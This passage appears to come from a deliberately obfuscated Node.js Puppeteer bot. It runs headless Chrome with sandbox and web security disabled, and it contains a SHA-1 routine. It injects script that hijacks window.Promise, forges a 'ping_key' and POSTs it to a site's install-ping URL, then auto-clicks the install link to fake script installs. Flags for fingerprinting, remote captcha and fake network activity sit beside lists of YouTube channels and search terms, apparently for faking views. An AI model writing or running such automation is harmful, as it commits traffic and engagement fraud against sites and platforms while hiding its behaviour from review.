              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x3 * -0x8e9 + 0x1895 + 0x236; J < -0x289 * 0xa + -0x9b5 * 0x1 + 0x235f; ++J)
                K = Q[J - (0x7 * -0x259 + 0x189d + -0x82b)] ^ Q[J - (-0xb46 + 0x24 + -0x1 * -0xb2a)] ^ Q[J - (0x94a + 0xd81 + -0x16bd)] ^ Q[J - (-0x1ccd + 0x8 * 0x36f + -0x1 * -0x165)], Q[J] = K << -0x3f * -0x1f + 0x247c + -0x2c1c | K >>> -0x5 * 0x4a9 + -0x3bb + -0x1b27 * -0x1;
              for (J = -0x7 * -0x3fd + -0x1 * 0x22e1 + 0x6f6; J < -0x4 * 0x9a1 + 0x25c5 + -0xd3 * -0x1; J += 0x22a0 + -0xe2b + 0x3 * -0x6d0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1eb7 * -0x1 + -0x1ef3 + 0x3daf * 0x1 | L >>> 0x332 * -0x2 + 0xf4d * -0x1 + 0x15cc) + (M & N | ~M & O) + P + (-0x1cc668da * -0x1 + 0x4 * -0xb401df3 + 0x71613b * 0xf1) + Q[J] << 0x1 * 0x8ad + 0x1390 + 0x1c3d * -0x1) << -0x26f9 + -0x1 * -0x1081 + -0x12f * -0x13 | P >>> -0xb83 * -0x2 + 0xc32 * 0x1 + -0x1 * 0x231d) + (L & (M = M << 0x1291 + -0xd * 0x9e + 0x11 * -0x9d | M >>> -0x21d5 + 0x1 * -0x21dd + 0x7 * 0x9ac) | ~L & N) + O + (0x2b * 0x3a24596 + 0x2a4b68ee + 0x6c0a9f87 * -0x1) + Q[J + (-0x98b * -0x1 + -0x6fb + -0x28f)] << 0x1699 + -0x264a + -0xfb1 * -0x1) << 0x8d2 + -0x1e65 + -0x2 * -0xacc | O >>> 0xfa3 + 0x230d * -0x1 + 0x1385) + (P & (L = L << -0xe87 + 0xe66 + -0x3f * -0x1 | L >>> -0x161c + -0x4d2 * 0x1 + 0x1af0) | ~P & M) + N + (0x5e8b5115 + 0x39ce * -0x27723 + 0x8a79d1ae) + Q[J + (0x1396 + -0x1225 + 0x16f * -0x1)] << 0x71 * -0x35 + -0x2b * 0x77 + 0x2b62 * 0x1) << 0x9f6 + -0x1f29 + 0x1538 | N >>> -0xd * -0x24b + 0x3 * 0x7f2 + -0x358a) + (O & (P = P << -0x129e + -0x11b5 * 0x1 + 0x2471 | P >>> -0x9ef + -0x1 * -0xf6a + 0x3 * -0x1d3) | ~O & L) + M + (0x1a308cf * -0x27 + 0x7a9ee26a + 0x1fb9eeb8) + Q[J + (-0xf9 * 0x3 + 0x25f4 + 0x1 * -0x2306)] << 0xcf0 + -0x9c1 * -0x3 + -0x2a33) << -0x23d8 + 0x1c9f + -0x6 * -0x135 | M >>> 0x18b + -0x1f9f + 0x1 * 0x1e2f) + (N & (O = O << 0xe * 0x97 + -0x164f * -0x1 + -0x1e73 | O >>> -0xb98 + -0x4 * -0x37c + -0x256) | ~N & P) + L + (-0x1b6a * -0x67d62 + -0x311d376a + -0x26498f91) + Q[J + (0x240c * 0x1 + 0x188 + -0x2590)] << 0x1 * -0x24ec + -0x10ef + -0x11 * -0x32b, N = N << -0x7 * -0x4e5 + 0x73d * 0x3 + -0x1bee * 0x2 | N >>> 0x25ec + 0x1 * 0x2402 + -0x49ec;
              for (; J < 0x1 * 0x14bd + -0x1b2b + 0x696; J += 0x13 * 0x83 + -0x1d38 + 0x1384)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1fda + 0x136f + 0xc70 | L >>> 0x191f + 0x26c8 + -0x551 * 0xc) + (M ^ N ^ O) + P + (-0xa8edc1ad + 0x266a10db + 0x49 * 0x34e6edb) + Q[J] << 0xae6 + 0x5 * -0xa9 + -0x185 * 0x5) << -0x2312 * 0x1 + 0x199 * -0x1 + 0x24b0 | P >>> 0x269d * 0x1 + 0x196c + -0x31 * 0x14e) + (L ^ (M = M << 0x2 * 0x1115 + 0xcb6 + -0x2ec2 | M >>> 0x20 * 0x121 + 0x2f0 + -0x270e) ^ N) + O + (-0x1 * 0x170b3e0d + 0x3 * 0x3e488bfd + -0x34f47a49) + Q[J + (0x1393 + 0x79 + -0x140b)] << 0x5 * -0x632 + 0x123 * -0x1 + 0x201d) << -0x1776 + -0xebb + -0x92 * -0x43 | O >>> -0x154f * -0x1 + -0xc3a * -0x1 + 0xb * -0x30a) + (P ^ (L = L << 0x1e4d + -0x61 * 0x29 + -0xea6 | L >>> 0xfb7 + 0x161e + -0x1a5 * 0x17) ^ M) + N + (-0x73dbb2a0 + 0x221cfc70 + 0xc098a1d1) + Q[J + (-0x1bc7 + -0x141f + 0x38 * 0xdb)] << 0x28f * -0x7 + 0x23 * -0x11b + 0x389a) << -0x29 * -0xd + -0x56d + 0x7b * 0x7 | N >>> -0x9f4 * 0x2 + -0x887 + -0xd * -0x232) + (O ^ (P = P << 0x1fab + 0x1d63 + -0x6 * 0xa28 | P >>> -0x204d * -0x1 + 0x4 * -0x25 + -0x1 * 0x1fb7) ^ L) + M + (-0xce82bf78 + 0x191 * -0x133f7e + 0x15b831f77) + Q[J + (-0x830 + 0x10f5 * -0x2 + 0x2a1d)] << 0x16de * -0x1 + -0x1189 * 0x1 + 0x2867) << 0x5 * 0xa2 + -0x26 + -0x2ff | M >>> 0xa24 + 0x67 * -0x1f + -0x18 * -0x1a) + (N ^ (O = O << -0x3d * 0x57 + -0x2b * 0x49 + 0x211c | O >>> -0x17 * 0x119 + 0x481 + 0x14c0) ^ P) + L + (-0x94 * 0xb41b83 + 0x33 * -0x1b79802 + 0x12e8d1bc3) + Q[J + (-0x1b57 * 0x1 + -0x19db + 0x3536)] << -0x1 * -0x1dfe + 0x1 * 0x1ed7 + 0xb3 * -0x57, N = N << -0xb * 0x15a + 0x16 * -0x1b1 + 0x3432 | N >>> -0xdd6 * 0x1 + 0x234d * 0x1 + -0x1575;
              for (; J < 0x253e + 0x52e * -0x6 + -0x6 * 0xfd; J += -0x1415 + -0x4a * -0x22 + 0xa46)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2 * -0xc61 + -0x183a + 0x3101 | L >>> -0x75b + -0x2123 + 0x2899 * 0x1) + (M & N | M & O | N & O) + P - (-0x1abcdd0d + 0x1cacac0 * -0x74 + 0x15b84ff31) + Q[J] << -0x20e7 + 0xe * -0x191 + 0x36d5) << 0x2c7 * -0x4 + 0x9b3 + 0x6 * 0x3d | P >>> -0x444 + -0xb23 + 0x7c1 * 0x2) + (L & (M = M << -0x4 * 0xfb + -0x9d6 + 0x6f * 0x20 | M >>> 0x1 * -0x1d2b + 0x3 * -0xef + 0x2 * 0xffd) | L & N | M & N) + O - (-0x12d6d1d * -0x25 + -0x1 * -0xc16e341f + -0x7c1ab62c) + Q[J + (-0x20dd + -0x23 * -0x6b + 0x123d)] << 0x536 + 0x86 * 0x25 + 0x34 * -0x79) << -0x13bc + 0x1544 + 0x1 * -0x183 | O >>> 0x637 * -0x3 + -0xb10 + -0xc * -0x27c) + (P & (L = L << 0x47f * 0x7 + -0x207d + 0x122 | L >>> 0xe79 + 0x15ea + -0x2461) | P & M | L & M) + N - (-0x24 * -0x1cc4aa0 + 0x1c7432f4 + 0x13b591b0) + Q[J + (0x7eb + 0x13ce + -0x1bb7)] << -0x2f5 * 0x1 + -0x2190 * -0x1 + 0x5 * -0x61f) << 0x4d1 + 0x1190 + -0x165c | N >>> 0x10d4 + 0x1a3 * 0x3 + 0x4e * -0x47) + (O & (P = P << -0x1fa9 * -0x1 + -0x672 + -0x505 * 0x5 | P >>> 0x24ca * -0x1 + 0x2338 + 0x1 * 0x194) | O & L | P & L) + M - (-0x2 * -0x5c6830b4 + 0x9061 * -0xb69 + -0x417cbb7b) + Q[J + (0x27 * -0xe8 + -0xe * -0x96 + 0x3e1 * 0x7)] << -0x1c19 + -0x2 * 0x1283 + -0x1 * -0x411f) << 0x518 * -0x6 + -0x1 * -0x232f + -0x3e * 0x13 | M >>> 0x1 * -0x1600 + -0x16bd * -0x1 + 0x9 * -0x12) + (N & (O = O << -0xf79 * -0x1 + -0xe02 + -0x159 | O >>> 0x19fa + 0x489 * -0x3 + 0x3 * -0x41f) | N & P | O & P) + L - (0xdac84e94 + 0xd6b8b8fa + -0x1409cc46a * 0x1) + Q[J + (-0x223d + -0x20e * -0x7 + 0x1 * 0x13df)] << -0x1859 + 0x5d * -0x3c + -0x1 * -0x2e25, N = N << 0x9d9 * -0x2 + -0x1530 + 0x2900 | N >>> 0xb59 + -0x9c0 + -0xb * 0x25;
              for (; J < -0x1715 + -0x987 + -0xc4 * -0x2b; J += -0x29b * 0x9 + -0x190f + 0x3087)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb85 + -0xf20 + 0x3a0 | L >>> -0x39 * 0x1d + 0xad1 + -0x63 * 0xb) + (M ^ N ^ O) + P - (0x1 * -0x3817b8b4 + 0x4c09ac1b + 0xb99c5 * 0x2e7) + Q[J] << -0x3 * -0xcfb + 0xdd * 0x1 + 0x1 * -0x27ce) << 0x2 * -0x7 + 0x1322 + -0x2b9 * 0x7 | P >>> -0x1 * 0x252d + -0x9 * -0x86 + -0x2092 * -0x1) + (L ^ (M = M << -0x5dd + 0x25af * 0x1 + -0x1fb4 | M >>> -0x7 * 0x15d + -0x3 * -0x61f + -0x234 * 0x4) ^ N) + O - (-0x2b7ae39 * 0x9 + -0x2ed523b8 + 0x7ce781e3) + Q[J + (0x23d8 + 0xb27 + 0xa * -0x4b3)] << -0x1 * -0xad + 0x1905 * -0x1 + 0x13 * 0x148) << -0x14ae + -0x452 * -0x1 + -0x257 * -0x7 | O >>> -0x1 * 0x16ba + -0x1a45 + 0x311a) + (P ^ (L = L << 0x20cc + 0xa * 0x325 + 0x156 * -0x30 | L >>> -0x1743 + 0xbaf + 0xb96) ^ M) + N - (0x407 * -0x2fe27 + 0xe818acc * -0x1 + 0x502c5807) + Q[J + (-0x1e6f + -0x20eb * 0x1 + 0x3f5c)] << 0x2 * 0x77c + 0x32d * 0x5 + -0x1ed9) << 0x1 * -0x24e8 + -0x4 * -0xa9 + 0x2249 | N >>> 0x8 * 0x2ad + -0x840 + -0xd0d * 0x1) + (O ^ (P = P << 0x1 * 0x433 + -0xc6f + 0x85a | P >>> -0x397 + -0xf67 + 0x1300) ^ L) + M - (-0x89 * 0xb2426a + 0x65155789 + -0x2fed715b * -0x1) + Q[J + (0x313 + -0x2009 + 0x1cf9 * 0x1)] << 0x11b + 0x7 * 0x535 + -0x258e) << 0x19f9 + -0xbb9 + -0xe3b | M >>> -0x2 * 0x22d + -0xc14 * 0x3 + 0x1 * 0x28b1) + (N ^ (O = O << -0xf6c + -0x11 * -0xa9 + 0x451 | O >>> 0x12c7 + -0x1 * -0xec2 + 0x2187 * -0x1) ^ P) + L - (-0x32f124cb + -0x22c43f75 + 0x8b52a26a) + Q[J + (0x77 * 0x10 + -0xed * 0x1f + 0x1547)] << 0x20fb + 0x7e5 * 0x1 + -0x28e0, N = N << -0x1cb0 + -0xae2 + -0x4f6 * -0x8 | N >>> -0x17 * 0x100 + 0x268c + -0xf8a;
              this['h0'] = this['h0'] + L << 0x1 * 0x319 + -0xc29 + 0x910, this['h1'] = this['h1'] + M << -0x125b * -0x1 + 0x17ba + -0x2a15, this['h2'] = this['h2'] + N << -0x177b + 0x1 * 0x2ed + 0x148e, this['h3'] = this['h3'] + O << -0x3 * 0x461 + 0x126f + -0x54c, this['h4'] = this['h4'] + P << 0x7ed * -0x1 + -0x20ca + -0x1 * -0x28b7;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xf21 * 0x1 + -0xa1 + -0xe64 & -0x174 * 0x5 + 0x90 + 0x6c3] + w[J >> -0x3 * 0x405 + -0x1a18 + 0x263f & 0x1 * -0x1ba1 + -0xcbd * 0x3 + 0x41e7 * 0x1] + w[J >> -0x5e + 0x1b2c + 0xb * -0x26e & -0x1eb4 + -0x2 * -0x65f + 0x1205] + w[J >> 0x4b * 0x67 + 0x6f5 * 0x1 + 0x16d * -0x1a & -0x74 + -0x5c3 * 0x5 + 0x1d52] + w[J >> 0x4c7 + 0x50 * 0x11 + -0xa0b & -0x1314 * -0x2 + -0x2 * -0x911 + -0x1 * 0x383b] + w[J >> -0x21ad * -0x1 + -0x12d9 + -0xecc & -0x1 * 0x1f0c + -0x43 + 0x92 * 0x37] + w[J >> -0xf21 + 0x20f0 + -0x1 * 0x11cb & 0x5ab * -0x1 + 0x1 * 0x567 + 0x53 * 0x1] + w[0x3e9 * 0x4 + -0x748 * 0x1 + -0x11 * 0x7d & J] + w[K >> -0x233e + -0xd * 0x45 + 0x26db & -0xe * 0x14e + 0x5 * 0x603 + -0xbbc] + w[K >> 0xf09 + 0x1 * 0x229a + 0x481 * -0xb & -0x25c7 + 0x1df3 + 0x7e3 * 0x1] + w[K >> 0x1d * -0x4b + -0x5 * -0x48d + 0x25d * -0x6 & 0x7 * -0x314 + -0x3 * -0x8af + -0x472] + w[K >> 0xb3 + -0x1 * 0xf8b + 0xee8 & 0x47 * 0x7c + 0x435 * -0x1 + -0x1e20] + w[K >> -0x4 * -0x167 + -0x7 * -0x4d6 + -0x276a & 0x1e20 + 0xa6d + -0x287e] + w[K >> -0x2 * -0x66b + -0x6b5 + -0xdf * 0x7 & 0x1 * 0x22b7 + -0xa0e + -0x189a] + w[K >> 0x21 * -0x43 + -0x3 * 0x8d5 + 0x2326 & 0xd7 * 0x26 + 0x1d11 + -0x3cec] + w[0xbd * -0x22 + -0x2f2 + -0x59f * -0x5 & K] + w[L >> 0xbe * 0x2f + -0x7 * -0x1d3 + -0x1 * 0x2f8b & 0x3eb + -0xbad + -0x29b * -0x3] + w[L >> -0x22bc + -0x3f + 0x2313 & -0x84b + -0x3ad * -0xa + -0x1c68] + w[L >> 0xfd9 * -0x2 + -0x1a93 + 0x3a59 & -0x19b8 + -0x1426 + 0x2ded] + w[L >> 0x49a * -0x2 + 0x11d0 * 0x2 + 0xe * -0x1e2 & -0x295 * 0xf + 0x1acd + 0xbfd] + w[L >> -0x2242 + 0x2 * -0x52c + 0x2ca6 & 0x149a + -0xc17 + -0x21d * 0x4] + w[L >> -0x19cc + -0xe2 + 0x1ab6 & 0x2f * -0xbc + -0x1 * 0x13be + 0x3651] + w[L >> -0x36d + -0xb1 + 0x422 & 0x3d * -0x98 + -0x2458 + 0x3 * 0x1835] + w[0xb * 0x1b7 + 0x24b * 0x4 + -0x1bfa & L] + w[M >> 0x1d2 * -0x3 + -0x24b * -0x4 + -0x39a & 0x2 * -0x4cd + 0x17ed + -0xe44] + w[M >> -0x1 * 0x1fb5 + -0x1b76 + 0x3b43 & 0x1491 + -0x1eec + 0x1f * 0x56] + w[M >> 0x1 * 0x1549 + 0x5eb + -0x1b20 & -0x50 * -0x17 + 0x17 * 0x89 + -0x1370] + w[M >> -0x776 + 0x13c * -0xd + -0x35e * -0x7 & -0x5a3 + 0x91 * 0x22 + -0xd90] + w[M >> -0xc9d * -0x3 + -0x6 * 0x329 + -0x12d5 & -0x8df + 0x222d + -0x193f * 0x1] + w[M >> -0x198a + 0x1177 + 0x81b & -0x640 + -0x56 * -0x31 + -0xa27] + w[M >> 0x127f * -0x1 + 0x180c + -0x589 & -0x9d7 + -0x533 + 0x305 * 0x5] + w[-0x5af * 0x2 + 0x32f * -0x7 + 0x21b6 & M] + w[N >> 0x1308 + -0x1afd + -0x127 * -0x7 & -0x919 + -0x9a * 0x19 + 0x1832] + w[N >> -0x137e + -0x2605 * 0x1 + 0x399b & 0xce5 + -0x34 * -0xa7 + -0x7cb * 0x6] + w[N >> -0x19aa + 0x5 * 0x1d7 + -0x37 * -0x4d & 0x1a * 0x2b + 0x1 * -0x1985 + -0x2 * -0xa9b] + w[N >> -0xf23 + 0x1b * 0x16e + -0x1767 & 0x2 * -0x369 + 0x51 * -0x1 + 0x732] + w[N >> 0x2 * 0x2f0 + 0xddf + -0x13b3 & 0x1 * -0x26b5 + -0x1675 + -0x7 * -0x8bf] + w[N >> 0x8c4 + -0x1fd6 + 0x1 * 0x171a & 0x3 * -0x8b1 + 0x2 * 0x668 + -0x2 * -0x6a9] + w[N >> 0x7a * -0x22 + -0x236c + 0x33a4 & 0xa27 + 0xb * -0xcd + -0x149] + w[-0x1 * -0x1853 + 0x1 * 0x1123 + 0x1 * -0x2967 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x8c9 * 0x3 + -0x182b + -0x218 & -0x1 * -0x1d4f + 0x9c1 * -0x2 + -0x8ce,
                J >> -0x13ae + -0x1 * 0x2dd + 0x1 * 0x169b & 0x666 + -0x1a * 0xb6 + 0xd15,
                J >> -0x109 * 0xe + 0x1 * 0x12c7 + -0x441 & -0x48 * 0x8a + 0x2d8 * -0x4 + 0x332f,
                -0x5 * -0x5f7 + -0xf42 + -0xd92 & J,
                K >> -0xb * 0x1a7 + 0x31 * -0x51 + -0x5a1 * -0x6 & -0x1a3f + 0xe5a + -0x84 * -0x19,
                K >> 0x31 * 0x13 + -0x1220 + 0x2e9 * 0x5 & 0x65 * -0x20 + -0x1 * -0x5cd + -0x7 * -0x11e,
                K >> -0x1 * -0x7ef + -0x199a + -0x11b3 * -0x1 & 0x2606 + -0xb65 + 0xc1 * -0x22,
                -0x8 * -0x2b3 + 0x1 * -0x137a + 0x11f * -0x1 & K,
                L >> -0x271 + 0x1 * -0x21ec + -0x225 * -0x11 & 0x7bb + -0xbfa + 0x53e * 0x1,
                L >> -0x1 * 0xc7 + 0xa2b * 0x1 + -0x31c * 0x3 & -0x238e + -0x980 + -0x2e0d * -0x1,
                L >> -0xd * 0x2ad + 0x281 * 0x5 + 0x164c & -0x741 + -0x5 * 0x73 + -0xa7f * -0x1,
                -0x147a + 0x1a * -0x89 + -0x1 * -0x2363 & L,
                M >> 0xcf * -0xe + 0x5 * 0x96 + 0xb5 * 0xc & 0x8 * -0x2fb + 0x31f + 0x15b8,
                M >> -0xc51 * -0x1 + 0xb5d + -0x179e & 0xf7 + -0xa9f + 0xaa7 * 0x1,
                M >> 0x84e + 0x2409 + 0xc7 * -0x39 & 0x3 * 0xbbd + -0x1e5e + -0x22 * 0x1d,
                -0x1 * -0x1d7 + 0x1 * -0x393 + -0x2bb * -0x1 & M,
                N >> -0x2c5 * -0x1 + 0xb70 + -0x1 * 0xe1d & -0x7 * 0x4af + -0x1c53 + 0x3e1b,
                N >> 0xa9 * -0x39 + -0x1b73 * 0x1 + 0x1049 * 0x4 & 0x12f7 + -0x1 * 0xc8b + 0x3 * -0x1cf,
                N >> -0x2102 + -0x13 * 0x6c + 0x290e & -0x1d90 + 0x771 + 0x171e,
                0xc * -0x107 + 0x23b0 + -0x165d & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1d4c + -0x226 + 0x1f86), (K = new DataView(J))['setUint32'](-0x502 * -0x4 + -0x16a1 + 0x299, this['h0']), K['setUint32'](0x18fc + 0x5c0 + -0x1eb8, this['h1']), K['setUint32'](0xc2e + 0x1585 + -0x21ab, this['h2']), K['setUint32'](-0x1 * -0x675 + -0x1399 * -0x1 + -0x1a02, this['h3']), K['setUint32'](-0x1 * 0x13b7 + -0x2332 + 0x36f9, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1a4a + -0x1625 * 0x1 + -0x425];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x2b3 * 0x5 + 0x41b * -0x1 + -0x1 * -0x119a;
            J[0x13e2 + 0x226 + 0x5 * -0x468]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x832 * 0x2 + -0x24d0 + -0x6 * -0x8de] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1d66 + 0x1 * 0x22f7 + -0x405c), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xbee + 0x2 * 0x7ba + -0x1b61;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x22 + -0x16b4 + 0x1c6e), Promise['resolve'](0x20ce + -0x8ad + 0x4 * -0x608);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1902 + 0x1f * 0x10f + -0x83 * 0x71; j < 0x2267 * -0x1 + 0x6 * -0x153 + 0x2a5a; j++)
    i();
}
const NETWORK_PATIENCE = -0x355f + -0x2286 + 0x7725 + (0x2 * 0x411 + 0x259 * 0x1 + 0x13d * 0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1369 + -0x751 * -0x1 + -0x7 * 0x3d1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + W(0x6) + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x21b9 + -0x4ad + -0x1d0c * 0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x174 * -0xb + -0xa9a + 0x6 * -0xe4)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0xb2b + 0x5 * 0x550 + -0x1 * 0xf5b)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1 * -0x16f2 + -0x2486 + 0xd97 * 0x1);

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x798 + -0x243 + -0x555);
    let h = e[f];
    if (b['VRxksa'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
